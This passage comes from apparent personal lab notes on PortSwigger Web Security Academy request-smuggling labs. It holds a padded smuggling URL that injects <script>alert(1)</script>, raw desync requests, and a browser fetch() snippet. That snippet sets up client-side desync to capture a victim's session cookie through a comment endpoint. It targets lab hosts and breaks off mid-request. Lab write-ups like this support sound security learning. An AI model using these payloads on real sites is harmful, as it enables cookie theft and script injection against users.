aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
Foo: bar
```

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/58b864a5-4812-449c-8f8d-5467d27a28ed)








Copy url using burpe and we solved this lab
```
https://0a32002d03a09fef8257c5f6005d0022.web-security-academy.net/%20HTTP/1.1Host:%200a32002d03a09fef8257c5f6005d0022.web-security-academy.netGET%20/resources?<script>alert(1)</script>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%20HTTP/1.1Foo:%20bar
```
**Client-side desync**

From <https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync> 


because the server ignores the Content-Length header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie. 

From <https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync> 


Identify the vulnerable endpoint(disable update content-length)

We get an immediate response when changing the content length to 1 and change our request to post 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9ea798fb-ed95-458b-a7a5-fadff612c86b)



**Confirm desync vector in burpe**

Create two groups 
One with get request and the other with a post request 
For our post request

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.h1-web-security-academy.net
Connection: close
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x
```

Send request in sequence
We got a 404 indicating a desync
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/012c1ceb-e5fa-4a4b-836d-011b677774cf)







**Replicating desync vector in browser**
Open in chrome, go to network and enable preserve log option

Navigate to console tab and replicate

```
fetch('https://0a7d009504d1f30482da936f00c50069.h1-web-security-academy.net/', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
        fetch('https://0a7d009504d1f30482da936f00c50069.h1-web-security-academy.net/', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/45ab3f04-eb90-423d-bca1-10b41c0318d3)


**Identify an exploitable gadget** 
Notice comment box 
Capturing comment submission 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/97c656d5-890c-42c3-a546-1580719cfccb)

Make a arbitrary request and place into groups

```
POST / HTTP/1.1
Host: 0a40001c03a43d63813c7022007d0052.h1-web-security-academy.net
Connection: keep-alive
Content-Length: 645
```

```
POST /en/post/comment HTTP/1.1
Host: 0a40001c03a43d63813c7022007d0052.h1-web-security-academy.net
